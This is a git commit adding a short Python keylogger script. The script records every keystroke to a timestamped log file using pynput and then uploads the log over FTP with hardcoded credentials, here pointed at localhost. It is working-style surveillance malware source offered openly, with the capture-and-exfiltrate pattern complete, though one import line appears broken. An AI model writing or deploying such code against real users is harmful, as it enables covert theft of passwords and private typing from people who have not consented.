b3c3f74ad0d992c2f9d538f09ef9b18f44f59958
Prometeo <xairi.valdivia@gmail.com>
2019-03-30 19:38:42 -0500

    keylogger

---
+++ keylogger/keylogger.py
@@ -0,0 +1,36 @@
+from pynput import Key, Listener
+import ftplib
+import logging
+
+logdir = ""
+
+logging.basicConfig(filename=(logdir+"klog-res.txt"),
+                    level=logging.DEBUG,
+                    format="%(asctime)s:%(message)s")
+
+
+def pressing_key(key):
+    try:
+        logging.info(str(key))
+    except AttributeError:
+        print("A special key {0} has been pressed.".format(key))
+
+
+def releasing_key(key):
+    if key == Key.esc:
+        return False
+
+
+print("\nStarted listening...\n")
+
+with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
+    listener.join()
+
+print("\nConnecting to the FTP and sending the data...")
+
+
+sess = ftplib.FTP("127.0.0.1", "user", "password")
+file = open("klog-res.txt", "rb")
+sess.storbinary("STOR klog-res.txt", file)
+file.close()
+sess.quit()
